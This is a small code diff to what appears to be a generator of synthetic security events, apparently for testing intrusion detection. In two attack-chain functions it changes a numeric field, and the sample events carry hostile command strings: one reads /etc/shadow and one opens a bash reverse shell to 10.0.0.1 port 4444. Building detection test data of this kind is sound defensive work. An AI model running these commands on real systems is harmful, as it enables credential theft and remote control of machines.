@@ -53,7 +53,7 @@ def chain_takeover():
     user, ip, ts = random.choice(PERSONAS)["username"], random.choice(ATTACKER_IPS), night_ts()
     return "Account takeover", [
         ("brute force, unknown IP", event(user, ip, ts, random.randint(9, 14), "")),
-        ("off-hours access, same IP", event(user, ip, ts, 0, "cat /etc/shadow")),
+        ("off-hours access, same IP", event(user, ip, ts, 7, "cat /etc/shadow")),
     ]
 
 
@@ -69,7 +69,7 @@ def chain_shell():
     user, ip, ts = random.choice(PERSONAS)["username"], random.choice(ATTACKER_IPS), night_ts()
     return "Brute force + reverse shell", [
         ("sustained brute force", event(user, ip, ts, 12, "")),
-        ("reverse shell", event(user, ip, ts, 0, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")),
+        ("reverse shell", event(user, ip, ts, 7, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")),
     ]
 
 
